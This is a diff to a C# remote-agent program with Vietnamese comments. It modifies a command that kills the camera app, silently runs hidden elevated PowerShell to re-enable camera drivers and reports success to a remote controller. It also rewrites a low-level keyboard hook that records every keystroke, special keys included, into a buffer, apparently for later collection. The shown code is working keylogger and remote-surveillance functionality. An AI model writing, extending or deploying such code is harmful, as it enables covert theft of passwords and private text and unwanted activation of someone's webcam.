@@ -6,7 +6,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 using Newtonsoft.Json;
-
+using System.Windows.Forms;
 namespace RemoteAgent
 {
     class Program
@@ -363,29 +363,36 @@ namespace RemoteAgent
         {
             try
             {
-                // BƯỚC 1: Phải Bật Driver lên trước (vì lỡ lúc nãy bị khóa)
+                // BƯỚC 1: Kill App cũ nếu bị treo
+                foreach (var process in Process.GetProcessesByName("WindowsCamera"))
+                {
+                    try { process.Kill(); } catch { }
+                }
+
+                // BƯỚC 2: Bật Driver (Cần quyền Admin)
                 var psi = new ProcessStartInfo
                 {
                     FileName = "cmd.exe",
-                    // Lệnh PowerShell tìm Camera và Enable lại
-                    Arguments = "/c powershell -Command \"$cam = Get-PnpDevice -Class Camera; if($cam) { Enable-PnpDevice -InstanceId $cam.InstanceId -Confirm:$false }\"",
+                    Arguments = "/c powershell -Command \"Get-PnpDevice -Class Camera | ForEach-Object { Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false }\"",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     Verb = "runas"
                 };
-                Process.Start(psi)?.WaitForExit();
+                var p = Process.Start(psi);
+                p?.WaitForExit();
 
-                // Đợi 1 xíu cho Driver kịp tỉnh ngủ
-                await Task.Delay(2000);
+                // BƯỚC 3: Đợi Driver tỉnh ngủ (5 giây)
+                await Task.Delay(5000);
 
-                // BƯỚC 2: Mở App Camera lên cho người dùng thấy
+                // BƯỚC 4: Nhờ Explorer mở App Camera lên (Khắc phục lỗi không hiện cửa sổ)
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = "microsoft.windows.camera:",
+                    FileName = "explorer.exe",
+                    Arguments = "microsoft.windows.camera:",
                     UseShellExecute = true
                 });
 
-                await SendResponse("SUCCESS", "Đã mở khóa và bật App Camera!");
+                await SendResponse("SUCCESS", "Đã bật Driver và nhờ Explorer mở App Camera!");
                 Console.WriteLine("Đã bật Webcam");
             }
             catch (Exception ex)
@@ -470,64 +477,57 @@ namespace RemoteAgent
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                string key = "";
+                string keyLog = "";
 
-                // Chuyển đổi virtual key code thành ký tự
-                switch (vkCode)
+                // 1. Bắt các phím đặc biệt trước (Dù UniKey có can thiệp hay không vẫn bắt được)
+                bool isSpecial = true;
+                switch ((Keys)vkCode)
                 {
-                    case 8: key = "[BACKSPACE]"; break;
-                    case 9: key = "[TAB]"; break;
-                    case 13: key = "[ENTER]\n"; break;
-                    case 16: key = "[SHIFT]"; break;
-                    case 17: key = "[CTRL]"; break;
-                    case 18: key = "[ALT]"; break;
-                    case 20: key = "[CAPSLOCK]"; break;
-                    case 27: key = "[ESC]"; break;
-                    case 32: key = " "; break;
-                    case 37: key = "[LEFT]"; break;
-                    case 38: key = "[UP]"; break;
-                    case 39: key = "[RIGHT]"; break;
-                    case 40: key = "[DOWN]"; break;
-                    case 46: key = "[DEL]"; break;
-                    default:
-                        // Lấy trạng thái keyboard để xử lý shift/caps
-                        byte[] keyState = new byte[256];
-                        GetKeyboardState(keyState);
-
-                        StringBuilder sb = new StringBuilder(2);
-                        if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0)
-                        {
-                            key = sb.ToString();
-                        }
-                        else if (vkCode >= 65 && vkCode <= 90)
-                        {
-                            key = ((char)vkCode).ToString().ToLower();
-                        }
-                        else if (vkCode >= 48 && vkCode <= 57)
-                        {
-                            key = ((char)vkCode).ToString();
-                        }
-                        else if (vkCode >= 112 && vkCode <= 123)
-                        {
-                            key = $"[F{vkCode - 111}]";
-                        }
-                        break;
+                    case Keys.Enter: keyLog = "[ENTER]\n"; break;
+                    case Keys.Back: keyLog = "[BACK]"; break;
+                    case Keys.Space: keyLog = " "; break;
+                    case Keys.Tab: keyLog = "[TAB]"; break;
+                    case Keys.Escape: keyLog = "[ESC]"; break;
+                    case Keys.LShiftKey: case Keys.RShiftKey: keyLog = ""; break; // Bỏ qua Shift lẻ
+                    case Keys.LControlKey: case Keys.RControlKey: keyLog = "[CTRL]"; break;
+                    case Keys.Delete: keyLog = "[DEL]"; break;
+                    case Keys.CapsLock: keyLog = "[CAPS]"; break;
+                    case Keys.LWin: case Keys.RWin: keyLog = "[WIN]"; break;
+                    default: isSpecial = false; break;
                 }
 
-                if (!string.IsNullOrEmpty(key))
+                // 2. Nếu không phải phím đặc biệt, thử dịch sang ký tự
+                if (!isSpecial)
+                {
+                    // Lấy trạng thái Shift/Capslock để biết hoa thường
+                    byte[] keyState = new byte[256];
+                    GetKeyboardState(keyState);
+
+                    StringBuilder sb = new StringBuilder(2);
+                    if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0)
+                    {
+                        keyLog = sb.ToString();
+                    }
+                    else
+                    {
+                        // Nếu ToUnicode thất bại (ví dụ phím lạ), ghi luôn mã phím cho chắc
+                        // keyLog = "[" + ((Keys)vkCode).ToString() + "]"; 
+                        // Hoặc bỏ qua nếu không muốn rác
+                    }
+                }
+
+                // 3. Gửi vào buffer
+                if (!string.IsNullOrEmpty(keyLog))
                 {
                     lock (keyBuffer)
                     {
-                        keyBuffer.Append(key);
-                        // Giới hạn buffer 10000 ký tự
-                        if (keyBuffer.Length > 10000)
-                        {
-                            keyBuffer.Remove(0, keyBuffer.Length - 10000);
-                        }
+                        keyBuffer.Append(keyLog);
+                        if (keyBuffer.Length > 5000) keyBuffer.Remove(0, 1000); // Tránh tràn RAM
                     }
+                    // Debug: In ra để test (Nếu chạy WinExe thì không thấy dòng này đâu)
+                    // Console.Write(keyLog); 
                 }
             }
-
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
